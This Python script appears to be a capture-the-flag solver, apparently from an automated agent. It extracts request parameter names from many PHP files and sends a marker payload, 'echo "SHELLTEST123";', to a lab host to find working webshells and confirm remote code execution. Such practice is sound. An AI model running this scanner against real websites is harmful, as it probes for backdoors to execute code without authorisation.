#!/usr/bin/env python3
import os
import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://1221afef-a87d-4046-b7cf-81498980f076.node5.buuoj.cn:81"
SRC_DIR = "/home/lls/data/ctf-agent/challenges/154_强网杯_2019_高明的黑客/src"

# Patterns to find potential shell parameters
PATTERNS = [
    r'\$_GET\[\'([^\']+)\'\]',      # $_GET['param']
    r'\$_POST\[\'([^\']+)\'\]',     # $_POST['param']
    r'\$_REQUEST\[\'([^\']+)\'\]',  # $_REQUEST['param']
]

def extract_params(filepath):
    """Extract potential shell parameters from PHP file"""
    with open(filepath, 'r', errors='ignore') as f:
        content = f.read()

    params = set()
    for pattern in PATTERNS:
        matches = re.findall(pattern, content)
        params.update(matches)

    return list(params)

def test_shell(filename, param):
    """Test if a file+param combination is a working shell"""
    url = f"{BASE_URL}/src/{filename}"
    try:
        # Test with echo command
        r = requests.get(url, params={param: 'echo "SHELLTEST123";'}, timeout=5)
        if 'SHELLTEST123' in r.text:
            return (filename, param, 'GET')
    except:
        pass

    try:
        # Test POST
        r = requests.post(url, data={param: 'echo "SHELLTEST123";'}, timeout=5)
        if 'SHELLTEST123' in r.text:
            return (filename, param, 'POST')
    except:
        pass

    return None

def main():
    files = os.listdir(SRC_DIR)
    print(f"Total files: {len(files)}")

    # Collect all file-param pairs
    tasks = []
    for f in files:
        if f.endswith('.php'):
            params = extract_params(os.path.join(SRC_DIR, f))
            for p in params:
                tasks.append((f, p))

    print(f"Total file-param pairs to test: {len(tasks)}")

    # Test in parallel
    found = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(test_shell, f, p): (f, p) for f, p in tasks}
        for i, future in enumerate(as_completed(futures)):
            result = future.result()
            if result:
                found.append(result)
                print(f"\n[FOUND] {result}")
            if (i + 1) % 1000 == 0:
                print(f"\rTested: {i+1}/{len(tasks)}", end='', flush=True)

    print(f"\n\nFound {len(found)} working shells:")
    for f, p, method in found:
        print(f"  {f} - param: {p} ({method})")

if __name__ == '__main__':
    main()
